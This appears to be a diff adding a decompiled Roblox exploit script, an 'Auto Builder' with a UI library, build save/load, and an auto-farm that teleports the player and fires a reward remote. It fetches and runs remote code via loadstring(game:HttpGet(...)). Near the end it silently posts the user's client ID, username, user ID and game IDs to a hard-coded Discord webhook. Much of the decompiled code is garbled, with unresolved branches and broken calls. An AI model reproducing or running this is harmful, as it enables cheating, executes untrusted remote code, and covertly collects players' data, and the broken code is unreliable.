+                        }
+
+                        if v2.source == "Lua" then
+                            func_48629e9b("Text")
+                            v5.Changed:Connect(func_48629e9b)
+                        else
+                            if v2.source == "Logs" then
+                                v6.Visible = false
+                                highlight_logs("Text")
+                                v5.Changed:Connect(highlight_logs)
+                            end
+                        end
+
+                        config.Set = function(p0, p1)
+                            v5.Text = tostring(p1)
+                        end
+                        config.Get = function(p0)
+                            return v5.Text
+                        end
+                        config.Log = function(p0, p1)
+                            v5.Text = v5.Text .. "[*] " .. tostring(p1) .. "
+"
+                        end
+
+                        return config, v3
+
+                    end
+                end
+            end
+            config.AddHorizontalAlignment = function(p0)
+                local config = {}
+                local v = v2:FindFirstChild("HorizontalAlignment"):Clone()
+                v.Parent = v2
+                config.AddButton = function(p0, p1)
+                    local config = {}
+
+                    if typeof(config[1]) == "table" then
+                        local v = config[2]
+                        v.Parent = v
+
+                        return config[1], v
+
+                    end
+
+                    local v2 = config[1]
+                    v2.Parent = v
+
+                    return v2
+                end
+
+                return config, v
+            end
+            config.AddFolder = function(p0, p1)
+                local config = {}
+                -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                -- [!] UNRESOLVED JUMP -> lbl_5 (Fix manually)
+                local v = v2:FindFirstChild("Folder"):Clone()
+                local v2 = v:FindFirstChild("Button")
+                local v3 = v:FindFirstChild("Objects")
+                local v4 = v2:FindFirstChild("Toggle")
+                v.ZIndex = v.ZIndex + _upv0 * 10
+                v2.ZIndex = v2.ZIndex + _upv0 * 10
+                v3.ZIndex = v3.ZIndex + _upv0 * 10
+                v4.ZIndex = v4.ZIndex + _upv0 * 10
+                v2:GetChildren()[1].ZIndex = v2:GetChildren()[1].ZIndex + _upv0 * 10
+                v.Parent = v2
+                v2.Text = " " .. tostring("New Folder")
+
+                spawn(function(...)
+                    while true do
+
+                        if v2 and v2:GetChildren()[1] then
+                            v2:GetChildren()[1].ImageColor3 = v.main_color
+                        end
+
+                        RunService.Heartbeat:Wait()
+                    end
+                end)
+                local v5 = false
+                v2.MouseButton1Click:Connect(function(...)
+                    if v5 then
+                        func_7279f42e(v4, {
+                            Rotation = 0,
+                        }, v.tween_time)
+                        v3.Visible = false
+                    else
+                        func_7279f42e(v4, {
+                            Rotation = 90,
+                        }, v.tween_time)
+                        v3.Visible = true
+                    end
+
+                    v5 = not v5
+                end)
+                config.Fold = function(p0, p1)
+                    local config = {}
+
+                    if v5 then
+
+                        config.Rotation = 90
+                        func_7279f42e(v4, config, v.tween_time)
+                        v3.Visible = p1
+                        v5 = p1
+
+                        return
+
+                    end
+                end
+
+                spawn(function(...)
+                    while true do
+                        local config = {}
+
+                        if v5 then
+
+                            config.Size = UDim2.new(1, 0, 0, 20)
+                            func_7279f42e(v, config, v.tween_time)
+                            wait()
+                        end
+
+                        return
+
+                    end
+                end)
+
+                for v6, v7 in next(config) do
+                    config[v6] = function(p0)
+                        local config = {}
+
+                        if typeof(config[1]) == "table" then
+                            local v = config[2]
+                            v.Parent = v3
+
+                            return config[1], v
+
+                        end
+
+                        local v2 = config[1]
+                        v2.Parent = v3
+
+                        return v2
+                    end
+                end
+
+                return config, v
+            end
+
+            return config, v2
+        end
+
+        for v11, v12 in next(v2:GetDescendants) do
+
+            if func_74164eb3(v12, "ZIndex") then
+                v12.ZIndex = v12.ZIndex + _upv0 * 10
+            end
+        end
+
+        return config, v2
+
+    end
+end
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Players2 = game:GetService("Players")
+local v4 = ReplicatedStorage.BuildingParts
+local config4 = {}
+config4["blue"] = workspace["Really blueZone"]
+config4["yellow"] = workspace["New YellerZone"]
+config4["red"] = workspace["Really redZone"]
+config4["magenta"] = workspace.MagentaZone
+config4["black"] = workspace.BlackZone
+config4["white"] = workspace.WhiteZone
+config4["green"] = workspace.CamoZone
+
+if workspace:FindFirstChild("BuildPreview") then
+else
+    local model = Instance.new("Model")
+    local v5 = model
+    v5.Name = "BuildPreview"
+    v5.Parent = workspace
+end
+
+local localPlayer = Players2.LocalPlayer
+local v6 = localPlayer.Data
+local v7 = Color3.fromRGB
+local v8 = Vector3.new
+local v9 = CFrame.new
+local v10 = CFrame.Angles
+local v11 = math.floor
+local v12 = math.ceil
+local v13 = math.rad
+local v14 = string.split
+local v15 = string.find
+local v16 = table.insert
+local remoteFunction = Instance.new("RemoteFunction")
+local remoteEvent = Instance.new("RemoteEvent")
+local model2 = Instance.new("Model")
+local v17 = model2.SetPrimaryPartCFrame
+local v18 = workspace.FindFirstChild
+local v19 = workspace.GetChildren
+local v20 = workspace.Clone
+local v21 = CFrame.new().ToEulerAnglesXYZ
+local v22 = CFrame.new().ToObjectSpace
+
+if syn then
+
+    if not (syn.request) and not (request) then
+        local v23 = http_request
+    end
+
+    local v24 = 1
+    local v25 = false
+    ListBuilds = function(...)
+        local config = {}
+
+        for v, v2 in next(listfiles("")) do
+
+            if string.sub(v2, #v2 - 5, #v2) == ".Build" then
+                v16(config)
+            end
+        end
+
+        return config
+    end
+    local _upv1 = 16777216
+    local _upv2 = 65536
+    local _upv3 = 256
+    AnglesString = function(p0)
+        local v = v14(p0, ",")
+        -- [14] TailCall: return R2()
+
+        return v10
+    end
+    local _upv0 = string.gsub
+    String = function(p0)
+        -- [6] TailCall: return R1(R2, R3, R4)
+
+        return _upv0
+    end
+    Raw = function(p0)
+        -- [5] TailCall: return R1()
+
+        return unpack
+    end
+    Floor = function(p0, p1)
+        return v11(p0 * 10 ^ p1 + 0.5) / 10 ^ p1
+    end
+    local _upv1 = 57.29577951308232
+    GetStringAngles = function(p0)
+        local v, v2, v3 = v21(p0)
+
+        return Floor(v * _upv1, 5) .. "," .. Floor(v2 * _upv1, 5) .. "," .. Floor(v3 * _upv1, 5)
+    end
+    GetAngles = function(p0)
+        local v, v2, v3 = v21(p0)
+        -- [7] TailCall: return R4(R5, R6, R7)
+
+        return v10
+    end
+    GetTeam = function()
+        print(localPlayer.Team)
+    end
+    GetPlot = function()
+        return config4[tostring(localPlayer.Team)]
+    end
+    local config5 = {}
+    GetTeamPlayers = function(p0)
+        local config = {}
+
+        for v, v2 in next(Players2:GetPlayers) do
+
+            if tostring(v2.Team) == p0 then
+                v16(config5, p0)
+                v16(config, v2.Name)
+            end
+        end
+
+        return config
+    end
+    GetBlocks = function(p0)
+        local v = workspace.Blocks:FindFirstChild(p0)
+        local config = {}
+
+        if v then
+
+            for v2, v3 in ipairs(v:GetChildren()) do
+                table.insert(config, v3)
+            end
+        end
+
+        return config
+    end
+    GetTeamBlocks = function(p0)
+        local config = {}
+
+        for v, v2 in ipairs(GetTeamPlayers(p0)) do
+
+            for v3, v4 in ipairs(GetBlocks(v2)) do
+                table.insert(config, v4)
+            end
+        end
+
+        return config
+    end
+    GetPreviewBlocks = function(...)
+        local config = {}
+
+        for v, v2 in next(v19) do
+            v16(config, v2)
+        end
+
+        return config
+    end
+    GetTool = function(p0)
+        if v18(localPlayer.Backpack, p0) then
+
+            return localPlayer.Character[p0].RF
+
+        end
+    end
+    local config6 = {}
+    local CoreGui3 = game:GetService("CoreGui")
+    config6.Parent = CoreGui3
+    local v26 = func_11d5ba8f("ImageLabel", {
+        Parent = func_11d5ba8f("ScreenGui", config6),
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0, 0, 1, -20),
+        Size = UDim2.new(0, 140, 0, 20),
+        Image = "rbxassetid://2851926732",
+        ImageColor3 = Color3.fromRGB(20, 21, 23),
+        SliceCenter = Rect.new(12, 12, 12, 12),
+    })
+    func_11d5ba8f("ImageLabel", {
+        Parent = v26,
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0, 0, 1, -20),
+        Size = UDim2.new(0, 140, 0, 40),
+        Image = "rbxassetid://2851926732",
+        ImageColor3 = Color3.fromRGB(20, 21, 23),
+        ScaleType = Enum.ScaleType.Slice,
+        SliceCenter = Rect.new(12, 12, 12, 12),
+    })
+    local config10 = {}
+    config10.Parent = func_11d5ba8f("ImageLabel", {
+        Parent = v26,
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0, -10, 0, 0),
+        Size = UDim2.new(0, 90, 0, 20),
+        Image = "rbxassetid://2851926732",
+        ImageColor3 = Color3.fromRGB(41, 74, 122),
+        ScaleType = Enum.ScaleType.Slice,
+        SliceCenter = Rect.new(12, 12, 12, 12),
+    })
+    config10.BackgroundTransparency = 1
+    config10.Position = UDim2.new(0, 10, 0, 0)
+    config10.Size = UDim2.new(0, 90, 0, 20)
+    config10.Image = "rbxassetid://2851926732"
+    config10.ImageColor3 = Color3.fromRGB(41, 74, 122)
+    config10.ScaleType = Enum.ScaleType.Slice
+    config10.SliceCenter = Rect.new(12, 12, 12, 12)
+    func_11d5ba8f("TextLabel", {
+        Parent = func_11d5ba8f("ImageLabel", config10),
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0, 5, 0, 0),
+        Size = UDim2.new(1, 0, 0, 20),
+        ZIndex = 11,
+        Font = Enum.Font.GothamBold,
+        Text = "Progression",
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        TextSize = 14,
+        TextXAlignment = Enum.TextXAlignment.Left,
+    })
+    local _upv0 = func_11d5ba8f("TextLabel", {
+        Parent = v26,
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0, 95, 0, 0),
+        Size = UDim2.new(1, -95, 1, 0),
+        Font = Enum.Font.GothamBold,
+        Text = " NaN",
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        TextSize = 14,
+        TextXAlignment = Enum.TextXAlignment.Left,
+    })
+    UpdateProgression = function(p0)
+        if typeof(p0) == "number" then
+
+            _upv0.Text = p0
+
+            return
+
+        end
+    end
+    local _upv0 = nil
+    Encode = function(p0, p1)
+        local config = {}
+
+        if p1 then
+
+            _upv0 = GetPlot()
+
+            for v, v2 in next(p0) do
+                local v3 = v2.Name
+                local v4 = v2.PPart
+
+                if not (config[v3]) then
+                    local config2 = {}
+                    config[v3] = config2
+                end
+
+                local v5 = v22(_upv0.CFrame, v4.CFrame)
+                local config3 = {}
+                config3.Rotation = GetStringAngles(v5)
+                config3.Position = String(v5.p)
+
+                if v4.CastShadow == true then
+                else
+                end
+
+                config3.ShowShadow = true
+
+                if v4.CanCollide == true then
+                else
+                end
+
+                config3.CanCollide = true
+
+                config3.Anchored = true
+
+                if 0 < v4.Transparency then
+
+                    config3.Transparency = nil
+
+                    if v15(v3, "Block") and v4.Size ~= v8(2, 2, 2) then
+
+                        if not (String(v4.Size)) then
+                        end
+
+                        config3.Size = nil
+
+                        if v4.Color ~= v4[v3].PPart.Color then
+
+                            if not (String(v4.Color)) then
+                            end
+
+                            config3.Color = nil
+                            v16(config[v3], config3)
+                        end
+
+                        -- [108] TailCall: return R3(R4, R5)
+
+                        return HttpService:JSONEncode
+
+                    end
+                end
+            end
+        end
+    end
+    local HttpService2 = game:GetService("HttpService")
+    local _upv4 = Color3.new
+    Decode = function(p0, p1)
+        local config = {}
+
+        if not (p1) then
+            local v = 1
+        end
+
+        if not (xpcall(function()
+            config = HttpService2:JSONDecode(p0)
+        end, function(p0)
+            warn("Invalid JSON: ", p0)
+        end)) then
+            local config2 = {}
+
+            return config2
+
+        end
+
+        for v2, v3 in pairs(config) do
+
+            if v4:FindFirstChild(v2) then
+
+                for v4, v5 in ipairs(v3) do
+                    local v6 = v3[v4]
+                    v6.Position = v9(v8(Raw(v5.Position)) * v)
+                    v6.Rotation = AnglesString(v5.Rotation)
+
+                    if v5.Color then
+
+                        v6.Color = nil
+
+                        if v5.Size and v5.Size ~= "2,2,2" then
+
+                            v6.Size = nil
+                            v3[v4] = v6
+                        end
+
+                        config[v2] = nil
+                    end
+
+                    return config
+
+                end
+            end
+        end
+    end
+    Convert = function(p0)
+        local v = readfile(p0)
+        local config = {}
+
+        if not (v15(v, "/")) then
+
+            return nil
+
+        end
+
+        GetPlot()
+
+        for v2, v3 in next(v14) do
+            local v4 = v14(v3, ":")
+
+            if #v4 == 5 and v18(v4, v4[5]) then
+
+                if not (config[v4[5]]) then
+                    local config2 = {}
+                    config[v4[5]] = config2
+                end
+
+                local v5 = v22(v9(0, -17.9999924, 0), v9(Raw(v4[1])) * AnglesString(v4[2]))
+                local config3 = {}
+
+                if v4[3] ~= "-" then
+
+                    config3.Color = nil
+
+                    if v4[4] ~= "-" then
+
+                        config3.Size = nil
+                        config3.Position = String(v5.p)
+                        config3.Rotation = GetStringAngles(v5)
+                        v16(config[v4[5]], config3)
+                    end
+
+                    return HttpService2:JSONEncode(config)
+
+                end
+            end
+        end
+    end
+    SavePlot = function(p0, p1)
+        if p0 then
+
+            if not (p1) then
+
+                return
+
+            end
+
+            writefile(p0, Encode(GetTeamBlocks(p1), p1))
+
+            return
+
+        end
+    end
+    local _upv1 = 0
+    local _upv2 = 0
+    local _upv4 = 0.01
+    local _upv6 = table.remove
+    local _upv7 = remoteFunction.InvokeServer
+    LoadBlocks = function(p0, p1)
+        if p1 then
+
+            if not (config4[p1]) then
+                local v = GetPlot()
+            end
+
+            _upv1 = 0
+            _upv2 = 0
+
+            for v2, v3 in next(p0) do
+                _upv1 = _upv1 + #v3
+            end
+
+            local config = {}
+            local config2 = {}
+            local _upv9 = GetTool("ScalingTool")
+
+            for v4, v5 in ipairs(workspace.Blocks:GetDescendants()) do
+
+            end
+
+            for v6, v7 in next(p0) do
+                local v8 = v6[v6].Value
+
+                for v9, v10 in next(v7) do
+
+                    if v10.Size then
+                    else
+                        local v11 = v.CFrame * v10.Position * v10.Rotation
+                    end
+
+                    if func_b8ebc2c5(v11, v) and not (v10.Size) and not (v10.Color) then
+
+                        if not (v10.Transparency) and not (v10.CanCollide) then
+
+                            if v10.ShowShadow then
+                                v16(config, {
+                                    Position = v11.p,
+                                    Data = v10,
+                                })
+                            end
+
+                            if v25 and #config <= 5 then
+
+                                repeat
+                                    wait()
+                                until #config <= 5
+                            end
+
+                            _upv1 = _upv1 - 1
+                        end
+
+                        repeat
+                            wait()
+                        until #config == 0
+                        v5.ChildAdded:Connect(function(p0)
+                            local v = 1
+                            p0:WaitForChild("PPart", v)
+
+                            if not (v18(p0, "PPart")) then
+
+                                return
+
+                            end
+
+                            for v2, v3 in next(config) do
+
+                                if p0.PPart.Position - v3.Position.Magnitude < _upv4 then
+                                    v16(config2, {
+                                        Block = p0,
+                                        Data = v3.Data,
+                                    })
+                                    _upv6(config, v2)
+                                    _upv2 = _upv2 + 1
+                                    UpdateProgression(50 - _upv1 - _upv2 / _upv1 * 50)
+
+                                    if v3.Data.Size then
+
+                                        task.spawn(_upv7, _upv9, p0, v3.Data.Size, p0.PPart.CFrame * CFrame.new(0, -4, 0))
+                                    else
+                                    end
+                                end
+
+                                return
+
+                            end
+                        end):Disconnect()
+                        wait(1)
+                        _upv2 = 0
+                        local config4 = {}
+
+                        for v12, v13 in next(config2) do
+
+                            if v13.Data.Color then
+                                local config5 = {v13.Block, v13.Data.Color}
+                                v16(config4, config5)
+                            end
+                        end
+
+                        _upv7(GetTool("PaintingTool"), config4)
+                        UpdateProgression(100)
+                        wait(1.5)
+                        UpdateProgression("Done!")
+
+                        return
+
+                    end
+                end
+            end
+        end
+    end
+    LoadFile = function(p0, p1, p2)
+        if 0 < #v19(v5) then
+        else
+            if not (Convert(p0)) then
+            end
+        end
+
+        LoadBlocks(Decode(readfile(p0), p1), p2)
+    end
+    local _upv5 = workspace.GetDescendants
+    PreviewFile = function(p0, p1, p2)
+        if p2 then
+
+            for v, v2 in next(Decode(readfile(p0), p1)) do
+
+                for v3, v4 in next(v2) do
+                    local v5 = v20(v4[v])
+                    v17(v5, GetPlot().CFrame * v4.Position * v4.Rotation)
+                    v5.Health.Value = ""
+                    v5.Parent = v5
+
+                    v5.PPart.Size = v5.PPart.Size
+                    v5.PPart.Anchored = true
+
+                    if v4.Color then
+
+                        for v6, v7 in next(_upv5) do
+
+                            if v7:IsA("BasePart") then
+                                v7.Color = v4.Color
+                            end
+                        end
+                    end
+                end
+            end
+
+            return
+
+        end
+    end
+    local v27 = 0
+    local v28 = 0
+    local v29 = 0
+    local v30 = Instance.new("Part", v5)
+    v30["Transparency"] = 1
+    v30["Anchored"] = true
+    v30["CanCollide"] = false
+    reflectVec = function(p0, p1)
+        return p0 - 2 * p1 * p0:Dot(p1)
+    end
+    ReflectCFrame = function(p0, p1, p2)
+        local v = p1.Position
+        local v2 = p1.LookVector
+        local v3 = p0.Position
+        local v4 = v + reflectVec(v8(v3.X, v3.Y, v3.Z) - v, v2)
+        local v5 = -reflectVec(p0.XVector, v2)
+        local v6 = reflectVec(p0.YVector, v2)
+        local v7 = reflectVec(p0.ZVector, v2)
+        -- [47] TailCall: return R13(R14, R15, R16, R17, R18, R19, R20, R21, R22, R23, R24, R25)
+
+        return v9
+    end
+    MirrorBuild = function(...)
+        for v, v2 in next(v19) do
+
+            if v18(v2, "PPart") then
+                v17(v2)
+            end
+        end
+    end
+    UpdatePreview = function(p0)
+        local v, v2 = v5:GetBoundingBox()
+
+        if not (p0) then
+            local v3 = v8()
+        end
+
+        if v3 then
+
+            if not (v9(v.Position)) then
+            end
+
+            v30.CFrame = v
+            v30.Parent = v5
+            v5.PrimaryPart = v30
+            v17(v5, v * v10(v13(v27), v13(v28), v13(v29)) + v3)
+            v30.Parent = workspace
+
+            return
+
+        end
+    end
+    local _upv2 = workspace.Destroy
+    ClearPreview = function(...)
+        for v, v2 in next(v19) do
+            _upv2(v2)
+        end
+    end
+    local _upv0 = Vector3.new(2, 2, 2)
+    local _upv3 = loadstring(game:HttpGet("https://raw.githubusercontent.com/max2007killer/auto-build-v2-source-/main/listing.txt"))()
+    ListBuild = function(p0, p1)
+        -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+        -- [!] UNRESOLVED JUMP -> lbl_13 (Fix manually)
+        local config = {}
+        local config2 = {}
+
+        for v, v2 in next(Decode(readfile(p0), 1)) do
+
+            for v3, v4 in next(v2) do
+
+                if v4.Size then
+
+                    local v5 = 0 + 1 + v12(v4.Size.X * v4.Size.Y * v4.Size.Z / 8 + 0.5)
+                end
+
+                local v6 = v6[v].Value
+                local v7 = v5 - v6
+                config[v] = v5
+
+                if 0 < v7 then
+                    -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                else
+                end
+
+                config2[v] = nil
+            end
+
+            _upv3:Clear()
+
+            for v8, v9 in next(config) do
+                _upv3:Add(v8, v9, config2[v8])
+            end
+
+            return
+
+        end
+    end
+    local _upv0 = nil
+    local _upv3 = nil
+    local _upv2 = math.abs
+    local _upv4 = func_523b0b3e(function(p0)
+        local v = v11(p0 / _upv1)
+        local v2 = v11(p0 - v * _upv1 / _upv2)
+        local v3 = v11(p0 - v * _upv1 - v2 * _upv2 / _upv3)
+
+        return {
+            Color = v7(v, v2, v3),
+            Alpha = v11(p0 - v * _upv1 - v2 * _upv2 - v3 * _upv3 / 1),
+        }
+    end)
+    local _upv3 = loadstring(game:HttpGet("https://raw.githubusercontent.com/max2007killer/auto-build-v2-source-/main/listing.txt"))()
+    local _upv0 = false
+    local _upv3 = workspace:R134("BoatStages"):R134("NormalStages")
+    local _upv4 = workspace:R135("ClaimRiverResultsGold")
+    AutoFarm = function(p0)
+        _upv0 = p0
+
+        repeat
+
+            if _upv0 then
+                local config = {}
+                config.Velocity = Vector3.new(0, 0, 0)
+                local v = localPlayer.Character.HumanoidRootPart
+                config.Parent = v
+                func_11d5ba8f("BodyVelocity", config)
+
+                for v2 = 1, 10 do
+
+                    if localPlayer.Character and not (localPlayer.Character:FindFirstChild("Humanoid")) then
+
+                        repeat
+                            wait()
+                        until localPlayer.Character
+                    end
+
+                    localPlayer.Character.HumanoidRootPart.CFrame = _upv3["CaveStage" .. v2].DarknessPart.CFrame
+
+                    if v2 == 1 then
+
+                        wait(2 + 0.1)
+                        _upv4:FireServer()
+                    end
+
+                    localPlayer.Character:Remove()
+
+                    repeat
+                        wait()
+                    until localPlayer.Character
+                until not (localPlayer.Character:FindFirstChild("HumanoidRootPart"))
+
+                return
+
+            end
+        end
+    end
+    local v31 = config3:R159("Auto Builder", {
+        main_color = v7(41, 74, 122),
+        min_size = Vector2.new(300, 450),
+        toggle_key = Enum.KeyCode.RightControl,
+        can_resize = true,
+    })
+    local v32 = v31:R160("Main")
+    local v33 = nil
+    local v34 = 1
+    local _upv0 = v32:R163("Files", function(p0)
+        v33 = p0 .. ".Build"
+    end)
+    func_f0c4555a()
+    v32:R165("Refresh Files", func_f0c4555a)
+    local v35 = nil
+    local v36 = nil
+    local v37 = v32:R167("Saving")
+    local config14 = {}
+    config14["clear"] = false
+    v37:R168("File Name", function(p0)
+        v35 = p0 .. ".Build"
+    end, config14)
+    v37:R168("Team", function(p0)
+        v36 = localPlayer.Team
+    end):R168("My Team"):R168("white"):R168("blue"):R168("green"):R168("red"):R168("black"):R168("yellow"):R168("magenta")
+    v37:R168("Save To File", function(...)
+        SavePlot(v35, v36)
+        func_f0c4555a()
+    end)
+    v37:R168(true)
+    local v38 = v32:R169("Build Settings")
+    v38:R170("Safe Mode", function(p0)
+        v25 = p0
+    end)
+    v38:R170("Speed", function(p0)
+        v24 = 3
+    end):R170("Dangerous"):R170("Fast"):R170("Slow"):R170("Safe")
+    local config15 = {}
+    config15["clear"] = false
+    v38:R170("Size %", function(p0)
+        v34 = p0 / 100
+    end, config15)
+    v38:R170(true)
+    local v39 = v32:R170("Builder")
+    v39:R171("List Blocks", function(...)
+        ListBuild(v33, v34)
+    end)
+    v39:R171("Preview", function(...)
+        if 0 < #v19(v5) then
+            ClearPreview()
+        else
+            PreviewFile(v33, v34)
+        end
+    end)
+    v39:R171("Load File", function(...)
+        if 1 < #v19(v5) then
+
+            LoadFile(v33, v34)
+
+            return
+
+        end
+    end)
+    v39:R171(true)
+    local v40 = v31:R162("Images")
+    local v41 = nil
+    local v42 = nil
+    local v43 = 1
+    local v44 = 1
+    local config16 = {}
+    config16["clear"] = false
+    v40:R167("URL", function(p0)
+        v41 = p0
+    end, config16)
+    local v45 = v40:R167("Build Settings")
+    local config17 = {}
+    config17["clear"] = false
+    v45:R168("Block Size (Studs)", function(p0)
+        v43 = tonumber(p0)
+    end, config17)
+    local config18 = {}
+    local v46 = "clear"
+    config18[v46] = false
+    v45:R168("Image Size (Number)", function(p0)
+        v44 = tonumber(p0)
+    end, config18)
+
+    for v47, v48 in next(v19) do
+        local v49 = v48.Name
+
+        if string.sub(v49, #v49 - 4, #v49) == "Block" then
+            v45:R168("Block Type", function(p0)
+                v42 = p0
+            end):R175(v49)
+        end
+    end
+
+    v45:R169(true)
+    local v50 = v40:R168("Builder")
+    v50:R169("List Blocks", function(...)
+        func_6d04dc36(v41, v42)
+    end)
+    v50:R169("Preview", function(...)
+        if 0 < #v19(v5) then
+            ClearPreview()
+        else
+            func_e342e885(v41, v42, v43, v44, true)
+        end
+    end)
+    v50:R169("Load Image", function(...)
+        func_e342e885(v41, v42, v43, v44, false)
+    end)
+    v50:R169(true)
+    local v51 = v31:R163("Adjusters")
+    local v52 = 1
+    local v53 = v51:R165("Position Offset")
+    local config19 = {}
+    config19["clear"] = false
+    v53:R166("Move Multiplier", function(p0)
+        v52 = p0
+    end, config19)
+    v53:R166("Move Up", function(...)
+        UpdatePreview(v8(0, v52, 0))
+    end)
+    v53:R166("Move Down", function(...)
+        UpdatePreview(v8(0, -v52, 0))
+    end)
+    v53:R166("Move Left", function(...)
+        UpdatePreview(v8(v52, 0, 0))
+    end)
+    v53:R166("Move Right", function(...)
+        UpdatePreview(v8(-v52, 0, 0))
+    end)
+    v53:R166("Move Forwards", function(...)
+        UpdatePreview(v8(0, 0, v52))
+    end)
+    v53:R166("Move Backwards", function(...)
+        UpdatePreview(v8(0, 0, -v52))
+    end)
+    v53:R166(true)
+    local v54 = v51:R166("Rotation Offset")
+    local config20 = {}
+    config20["min"] = 0
+    config20["max"] = 360
+    v54:R167("X", function(p0)
+        v27 = p0
+        UpdatePreview()
+    end, config20)
+    local config21 = {}
+    config21["min"] = 0
+    config21["max"] = 360
+    v54:R167("Y", function(p0)
+        v28 = p0
+        UpdatePreview()
+    end, config21)
+    local config22 = {}
+    config22["min"] = 0
+    config22["max"] = 360
+    v54:R167("Z", function(p0)
+        v29 = p0
+        UpdatePreview()
+    end, config22)
+    v54:R167(true)
+    local v55 = v51:R167("Other")
+    local config23 = {}
+    config23["clear"] = false
+    v55:R168("Size %", function(p0)
+        ClearPreview()
+        PreviewFile(v33, tonumber(p0) / 100)
+    end, config23)
+    v55:R168("Mirror Build", MirrorBuild)
+    v55:R168(true)
+    local v56 = v31:R164("Other"):R165("Auto Farm")
+    v56:R166("Enabled", AutoFarm)
+    v56:R166(true)
+    local v57 = v31:R165("Info")
+    v57:R167("Click To Copy Credits", function()
+        setclipboard("
+Copied
+Credits to Sten for the original source
+My Profile Roblox : https://www.roblox.com/users/675170477/profile
+My Profile Disocrd : slade_yt
+My Server Discord : https://discord.gg/HjNaYs6AnV
+Donation : (metamask)
+ETH, LIN, BNB : 0xCfad4d8774951b4e1Ca334A9774d0F0e3a961D84
+")
+    end)
+    v32:R167()
+    config3:R167()
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local localPlayer2 = game.Players.LocalPlayer
+    print("")
+    local config24 = {}
+    config24["username"] = "Exec-AutoBuild-V2"
+    config24["content"] = "To join the game, click this link: [Join Game](https://web.roblox.com/home?placeID=" .. game.PlaceId .. "&gameID" .. game.JobId .. ")\nTo join the player, use this link: [Player Link](https://roblox.com/users/" .. localPlayer2.UserId .. "/profile)"
+    local config25 = {config26}
+    local config26 = {}
+    local config27 = {}
+    config27["name"] = "Script Execution"
+    config27["url"] = "https://discord.gg/HjNaYs6AnV"
+    config27["icon_url"] = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg"
+    config26["author"] = config27
+    local config28 = {}
+    config28["text"] = "slade was here"
+    config28["icon_url"] = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg"
+    config26["footer"] = config28
+    config26["title"] = "Script Execution Alert"
+    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+
+    if localPlayer2.DisplayName ~= localPlayer2.Name then
+
+        config26["description"] = string.format("Client ID: %s\nProfile: [Player Profile](https://roblox.com/users/%d/profile)\nUsername: **%s**\nDisplayName: **%s**\nUserID: **%d**\nGameID: **%s**\nGameName: **%s**", RbxAnalyticsService:R178(), localPlayer2.UserId, localPlayer2.Name, "N/A", localPlayer2.UserId, game.PlaceId, MarketplaceService:R167(game.PlaceId).Name)
+        config26["type"] = "rich"
+        config26["color"] = tonumber(65280)
+        local config29 = {}
+        config29["url"] = "https://media.discordapp.net/attachments/1186727033703764000/1209875883242819684/image.png?ex=65e883b8&is=65d60eb8&hm=42628065dbac00e45cbc1de9993c393739cdc921ed9f37591ec9300035858b26&=&format=webp&quality=lossless&width=96&height=93"
+        config26["image"] = config29
+        config24["embeds"] = config25
+        local HttpService3 = game:GetService("HttpService")
+        local config30 = {}
+        config30["content-type"] = "application/json"
+        local v58 = http_request
+
+        if not (v58) then
+            -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+        else
+        end
+
+        local config31 = {}
+        config31["Url"] = "https://discord.com/api/webhooks/1226211501443121162/Zkde32P3ZTZoGZkJlUO6k3to50BJ-fZougIgOfLmi81tc9jRSp8YTmEG3sTpQav0GDVq"
+        config31["Body"] = HttpService3:R172(config24)
+        config31["Method"] = "POST"
+        config31["Headers"] = config30
+        syn.request(config31)
+
+        return
+
+    end
+end
+
+local function func_7fe96847(p0)
+    local v = ""
+    p0:gsub(".", function(p0)
+        if tonumber(p0) ~= nil then
+            v = v .. p0
+        else
+            if p0 == "
+" then
+                v = v .. "
+"
+            else
+                if p0 == "	" then
+                    v = v .. "	"
+                else
+                    v = v .. " "
+                end
+            end
+        end
+    end)
+
+    return v
+
+end
+
+local function func_48629e9b(p0)
+
+    if p0 == "Text" then
+        v5.Text = v5.Text:gsub("\n", "")
+        v5.Text = v5.Text:gsub("	", " ")
+        local v = v5.Text
+        v5.Keywords.Text = func_528bc5f0(v, config4)
+        v5.Globals.Text = func_528bc5f0(v, config5)
+        local config = {"FireServer", "fireServer", "InvokeServer", "invokeServer"}
+        v5.RemoteHighlight.Text = func_528bc5f0(v, config)
+        v5.Tokens.Text = func_eb2455ba(v)
+        v5.Numbers.Text = func_7fe96847(v)
+        v5.Strings.Text = func_3b5b54e3(v)
+        v5.Comments.Text = func_05ede4cc(v)
+        local v2 = 1
+        v:gsub("\n", function(...)
+            v2 = v2 + 1
+        end)
+        v6.Text = ""
+
+        for v3 = 1, v2 do
+            v6.Text = v6.Text .. v3 .. "\n"
+        end
+
+        v4.CanvasSize = UDim2.new(0, 0, v2 * 0.153846154, 0)
+    end
+
+    if p0 == "Text" then
+        v5.Text = v5.Text:gsub("\n", "")
+        v5.Text = v5.Text:gsub("	", " ")
+        local v4 = v5.Text
+        v5.Info.Text = func_95208984(v4)
+        local v5 = 1
+        v4:gsub("\n", function(...)
+            v5 = v5 + 1
+        end)
+        v4.CanvasSize = UDim2.new(0, 0, v5 * 0.153846154, 0)
+    end
+
+    return
+
+end
+
+local function func_cb74df9d(p0)
+
+    return
+
+end
+
+local function func_528bc5f0(p0, p1)
+    local config = {}
+    local config2 = {}
+    config2["="] = true
+    config2["."] = true
+    config2[","] = true
+    config2["("] = true
+    config2[")"] = true
+    config2["["] = true
+    config2["]"] = true
+    config2["{"] = true
+    config2["}"] = true
+    config2[":"] = true
+    config2["*"] = true
+    config2["/"] = true
+    config2["+"] = true
+    config2["-"] = true
+    config2["%"] = true
+    config2[";"] = true
+    config2["~"] = true
+
+    for v, v2 in pairs(p1) do
+        config[v2] = true
+    end
+
